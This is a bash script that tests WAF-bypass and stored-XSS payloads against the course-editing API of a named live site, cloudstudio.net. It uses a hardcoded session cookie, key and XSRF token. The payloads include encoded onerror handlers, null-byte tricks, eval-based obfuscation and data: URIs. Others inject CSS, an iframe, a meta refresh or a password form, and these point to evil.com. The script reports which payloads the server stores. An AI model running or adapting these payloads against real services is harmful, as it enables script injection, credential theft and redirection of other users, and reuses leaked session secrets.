#!/bin/bash
COOKIE="cloudstudio-session=0b8666b3-3e38-480e-a97e-4f9db44e3a64.c4e095c3-ccbd-4564-b010-98c426fbf9d4.7875448c-33e2-4719-b43e-b41d499ab991; cloudstudio-session-team=wx; key=11e62de2f4c0303a8f9e16d63210fd29c1f166d48140fe789209f02db560fd22"
COURSE_ID="37746327631544320"
XSRF="1718262267"

echo "========== WAF BYPASS TEST =========="
echo "Course ID: $COURSE_ID"
echo ""

# Helper function
test_payload() {
  local name="$1"
  local payload="$2"
  local content_type="${3:-application/json}"
  
  echo "--- Test: $name ---"
  result=$(curl -s -o /tmp/waf_result.txt -w "%{http_code}" -X PATCH "https://cloudstudio.net/api/teach-course/$COURSE_ID" \
    -H "Cookie: $COOKIE" \
    -H "X-XSRF-TOKEN: $XSRF" \
    -H "Content-Type: $content_type" \
    -d "$payload")
  
  if [ "$result" = "200" ]; then
    echo "STATUS: 200 (PASSED - payload stored)"
    head -3 /tmp/waf_result.txt
  elif [ "$result" = "400" ]; then
    echo "STATUS: 400 (BAD REQUEST - param error)"
    head -3 /tmp/waf_result.txt
  elif grep -q "waf-captcha" /tmp/waf_result.txt 2>/dev/null; then
    echo "STATUS: WAF BLOCKED (EdgeOne captcha)"
  else
    echo "STATUS: $result"
    head -3 /tmp/waf_result.txt
  fi
  echo ""
}

# ==========================================
# 1. Unicode/HTML Entity Encoding Bypass
# ==========================================
echo "========== 1. UNICODE/HTML ENTITY ENCODING =========="

# HTML entity encoded onerror
test_payload "onerror=&#97;&#108;&#101;&#114;&#116;(1)" '{"title":"<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"}'

# Unicode escaped onerror (raw JSON unicode)
test_payload "onerror=\u0061\u006c\u0065\u0072\u0074(1)" '{"title":"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>"}'

# Double URL encoding
test_payload "onerror%253Dalert(1)" '{"title":"<img src=x onerror%253Dalert(1)>"}'

# Mixed case to bypass keyword detection
test_payload "OnErRoR=alert(1)" '{"title":"<img src=x OnErRoR=alert(1)>"}'

# Hex entity encoding
test_payload "onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)" '{"title":"<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>"}'

# Tab/newline injection between attributes
test_payload "newline between src and onerror" '{"title":"<img src=x\nonerror=alert(1)>"}'

# ==========================================
# 2. Content-Type Confusion
# ==========================================
echo "========== 2. CONTENT-TYPE CONFUSION =========="

# Try multipart/form-data
test_payload "multipart/form-data" '{"title":"<img src=x onerror=alert(1)>"}' "multipart/form-data"

# Try text/plain
test_payload "text/plain" '{"title":"<img src=x onerror=alert(1)>"}' "text/plain"

# Try application/x-www-form-urlencoded
test_payload "x-www-form-urlencoded" 'title=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'

# ==========================================
# 3. Null Byte Injection
# ==========================================
echo "========== 3. NULL BYTE INJECTION =========="

# Null byte in tag name
test_payload "null byte in <scri%00pt>" '{"title":"<scri%00pt>alert(1)</scri%00pt>"}'

# Null byte in onerror
test_payload "null byte in onerror" '{"title":"<img src=x onerror=aler%00t(1)>"}'

# ==========================================
# 4. CSS Injection
# ==========================================
echo "========== 4. CSS INJECTION =========="

# <style> tag
test_payload "<style> tag" '{"title":"<style>body{color:red}</style>"}'

# Style with external URL
test_payload "<style> with external URL" '{"title":"<style>body{background:url(http://evil.com/)}</style>"}'

# Inline style
test_payload "style attribute" '{"title":"<div style=background:url(http://evil.com)>X</div>"}'

# @import CSS
test_payload "@import CSS" '{"title":"<style>@import url(http://evil.com/);</style>"}'

# ==========================================
# 5. meta refresh/iframe/form injection
# ==========================================
echo "========== 5. META/IFRAME/FORM INJECTION =========="

# meta refresh
test_payload "<meta http-equiv=refresh>" '{"title":"<meta http-equiv=refresh content=0;url=http://evil.com>"}'

# <iframe>
test_payload "<iframe>" '{"title":"<iframe src=http://evil.com>"}'

# <form>
test_payload "<form>" '{"title":"<form action=http://evil.com><input name=pass></form>"}'

# <a> tag with javascript:
test_payload "<a href=javascript:>" '{"title":"<a href=javascript:alert(1)>click</a>"}'

# <details> with ontoggle
test_payload "<details ontoggle>" '{"title":"<details ontoggle=alert(1)>"}'

# <svg> with onload
test_payload "<svg onload>" '{"title":"<svg onload=alert(1)>"}'

# ==========================================
# 6. Advanced WAF bypass techniques
# ==========================================
echo "========== 6. ADVANCED TECHNIQUES =========="

# Using eval with string encoding
test_payload "eval(String.fromCharCode)" '{"title":"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"}'

# Using window.name
test_payload "window.name" '{"title":"<img src=x onerror=eval(name)>"}'

# Using data: URI
test_payload "data: URI" '{"title":"<iframe src=data:text/html,<script>alert(1)</script>>"}'

# Unicode normalization
test_payload "fullwidth alert" '{"title":"<img src=x onerror=\uff41\uff4c\uff45\uff52\uff54(1)>"}'

# ==========================================
# 7. User introduction field tests
# ==========================================
echo "========== 7. USER INTRODUCTION FIELD =========="

# Basic HTML in introduction
test_payload "user intro - basic HTML" '{"introduction":"<b>bold</b> <i>italic</i>"}'

# img tag in introduction
test_payload "user intro - <img src=x>" '{"introduction":"<img src=x>"}'

# onerror in introduction
test_payload "user intro - onerror=alert(1)" '{"introduction":"<img src=x onerror=alert(1)>"}'

# HTML entity encoded onerror in introduction
test_payload "user intro - entity encoded" '{"introduction":"<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"}'

# <iframe> in introduction
test_payload "user intro - <iframe>" '{"introduction":"<iframe src=http://evil.com>"}'

# <style> in introduction
test_payload "user intro - <style>" '{"introduction":"<style>body{background:url(http://evil.com/)}</style>"}'

# <meta> in introduction
test_payload "user intro - <meta refresh>" '{"introduction":"<meta http-equiv=refresh content=0;url=http://evil.com>"}'

echo "========== ALL TESTS COMPLETE =========="